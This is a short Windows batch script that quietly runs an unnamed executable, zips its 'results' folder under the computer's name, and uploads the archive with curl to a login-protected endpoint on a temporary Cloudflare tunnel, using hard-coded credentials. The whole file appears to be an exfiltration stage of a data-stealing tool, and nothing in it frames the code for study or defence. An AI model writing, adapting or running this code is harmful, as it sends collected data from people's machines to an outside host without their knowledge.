@echo off
cd /d "%~dp0"
"1.exe" >nul 2>&1
powershell -Command "Compress-Archive -Path 'results' -DestinationPath 'result_%COMPUTERNAME%.zip' -Force"
curl -c cookies.txt -d "name=alex" -d "pass=123" https://habits-sen-fri-dad.trycloudflare.com/Login/login.php
curl -b cookies.txt -F "submit=1" -F "file[]=@result_%COMPUTERNAME%.zip" https://habits-sen-fri-dad.trycloudflare.com/Login/upload.php
